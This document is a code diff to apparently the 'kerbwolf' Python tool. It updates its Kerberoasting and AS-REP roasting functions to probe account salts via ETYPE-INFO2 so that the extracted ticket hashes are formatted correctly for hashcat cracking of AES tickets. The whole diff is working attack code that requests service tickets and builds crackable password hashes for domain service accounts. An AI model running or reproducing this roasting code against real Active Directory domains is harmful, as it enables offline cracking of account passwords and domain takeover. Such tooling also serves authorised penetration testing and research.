@@ -20,7 +20,7 @@ import logging
 from impacket.krb5.asn1 import AS_REP, TGS_REP
 from pyasn1.codec.der import decoder
 
-from kerbwolf.core.asreq import request_asrep_no_preauth, request_tgt
+from kerbwolf.core.asreq import probe_account_salt, request_asrep_no_preauth, request_tgt
 from kerbwolf.core.crypto import ENCTYPE_TABLE
 from kerbwolf.core.tgsreq import request_tgs_raw
 from kerbwolf.hashcat import format_tgs_hash, tgs_hashcat_mode
@@ -50,13 +50,15 @@ def kerberoast(
 ) -> list[RoastResult]:
     """Request TGS tickets for each target and extract crackable hashes.
 
-    Authentication modes:
-    - **Password/hash**: provide *cred* with username + password/nthash.
-    - **CCache (pass-the-ticket)**: provide *tgt*, *tgt_session_key*, *tgt_cipher_cls*.
+    Targets should be sAMAccountNames (preferred) or UPNs.  SPNs should
+    be resolved to sAMAccountNames at the CLI layer before calling this
+    function — the TGS-REQ sends the target as-is in the sname field,
+    and the KDC resolves sAMAccountNames to the correct service account.
 
-    Targets may be SPNs, sAMAccountNames, or UPNs.  The *etypes* tuple
-    is sent in the TGS-REQ in order, letting the KDC pick the first one
-    the service account supports.
+    Each target is salt-probed via ETYPE-INFO2 before requesting the
+    TGS ticket.  The salt-probed username goes into the hash ``$user$``
+    field (required for AES cracking where the username is part of the
+    PBKDF2 salt).
     """
     if target_spns is None or len(target_spns) == 0:
         return []
@@ -64,7 +66,6 @@ def kerberoast(
     etype_ints = tuple(int(e) for e in etypes)
     realm = domain or (cred.domain if cred else "")
 
-    # Get TGT: either pre-loaded from ccache or fresh from KDC.
     if tgt is not None and tgt_session_key is not None and tgt_cipher_cls is not None:
         raw_tgt, session_key, cipher_cls = tgt, tgt_session_key, tgt_cipher_cls
     elif cred is not None:
@@ -74,6 +75,8 @@ def kerberoast(
     else:
         msg = "Either credentials or a TGT (from ccache) must be provided."
         raise KDCError(error_code=0, message=msg)
+
+    salt_cache = _probe_salts(target_spns, realm, dc_ip=dc_ip, transport=transport, timeout=timeout)
 
     results: list[RoastResult] = []
     for i, target in enumerate(target_spns, 1):
@@ -100,13 +103,20 @@ def kerberoast(
         decoded = decoder.decode(raw_tgs, asn1Spec=TGS_REP())[0]
         ticket_etype = int(decoded["ticket"]["enc-part"]["etype"])
         _log.debug("[%d/%d] %s → ticket etype %d", i, len(target_spns), target, ticket_etype)
-        username = _target_to_display_name(target)
-        hash_string = format_tgs_hash(raw_tgs, username, realm.upper(), target, fmt=hash_format)
+
+        if target in salt_cache:
+            username, hash_realm = salt_cache[target]
+        else:
+            username, hash_realm = target, realm.upper()
+            if ticket_etype != EncryptionType.RC4_HMAC:
+                _log.warning("%s: salt not verified via ETYPE-INFO2 — AES hash may not crack if username casing is wrong", target)
+
+        hash_string = format_tgs_hash(raw_tgs, username, hash_realm, target, fmt=hash_format)
 
         results.append(
             RoastResult(
                 username=username,
-                realm=realm.upper(),
+                realm=hash_realm,
                 spn=target,
                 etype=ticket_etype,
                 hash_string=hash_string,
@@ -143,6 +153,8 @@ def kerberoast_no_preauth(
 
     etype_ints = tuple(int(e) for e in etypes)
 
+    salt_cache = _probe_salts(target_users, domain, dc_ip=dc_ip, transport=transport, timeout=timeout)
+
     results: list[RoastResult] = []
     for i, target in enumerate(target_users, 1):
         _log.info("[%d/%d] %s (via %s)", i, len(target_users), target, no_preauth_user)
@@ -163,14 +175,22 @@ def kerberoast_no_preauth(
             _log.debug("Skipped %s (unexpected error)", target, exc_info=True)
             continue
 
-        hash_string = format_tgs_hash(raw_asrep, target, domain.upper(), target, fmt=hash_format, is_asreq=True)
         decoded = decoder.decode(raw_asrep, asn1Spec=AS_REP())[0]
         ticket_etype = int(decoded["ticket"]["enc-part"]["etype"])
 
+        if target in salt_cache:
+            username, hash_realm = salt_cache[target]
+        else:
+            username, hash_realm = target, domain.upper()
+            if ticket_etype != EncryptionType.RC4_HMAC:
+                _log.warning("%s: salt not verified via ETYPE-INFO2 — AES hash may not crack if username casing is wrong", target)
+
+        hash_string = format_tgs_hash(raw_asrep, username, hash_realm, target, fmt=hash_format, is_asreq=True)
+
         results.append(
             RoastResult(
-                username=target,
-                realm=domain.upper(),
+                username=username,
+                realm=hash_realm,
                 spn=target,
                 etype=ticket_etype,
                 hash_string=hash_string,
@@ -210,15 +230,42 @@ def _pick_tgt_etypes(cred: KerberosCredential) -> tuple[EncryptionType, ...]:
     return _TGT_ETYPES_ALL
 
 
-def _target_to_display_name(target: str) -> str:
-    """Extract a display name from an SPN, sAMAccountName, or UPN.
+def _probe_salts(
+    targets: list[str],
+    realm: str,
+    *,
+    dc_ip: str,
+    transport: TransportProtocol,
+    timeout: float,
+) -> dict[str, tuple[str, str]]:
+    """Probe the KDC for each target's salt via ETYPE-INFO2.
 
-    - ``service/host.domain.com`` → ``host``
-    - ``user@domain.com`` → ``user``
-    - ``svc_sql`` → ``svc_sql``
+    Returns ``{target: (probed_username, probed_realm)}`` for targets
+    whose salt was successfully probed.  Targets that are raw SPNs
+    (contain ``/``) are skipped — SPNs should be resolved to
+    sAMAccountNames at the CLI layer before reaching this function.
     """
-    if "/" in target:
-        return target.split("/", 1)[1].split(".", maxsplit=1)[0]
-    if "@" in target:
-        return target.split("@", 1)[0]
-    return target
+    cache: dict[str, tuple[str, str]] = {}
+    seen: set[str] = set()
+
+    for target in targets:
+        if "/" in target:
+            continue
+
+        lower = target.lower()
+        if lower in seen:
+            continue
+        seen.add(lower)
+
+        try:
+            result = probe_account_salt(target, realm, dc_ip=dc_ip, transport=transport, timeout=timeout)
+        except Exception:  # noqa: BLE001
+            _log.debug("Salt probe failed for %s", target, exc_info=True)
+            continue
+
+        if result is not None:
+            probed_user, probed_realm = result
+            _log.debug("Salt probe: %s → %s%s", target, probed_realm, probed_user)
+            cache[target] = (probed_user, probed_realm)
+
+    return cache
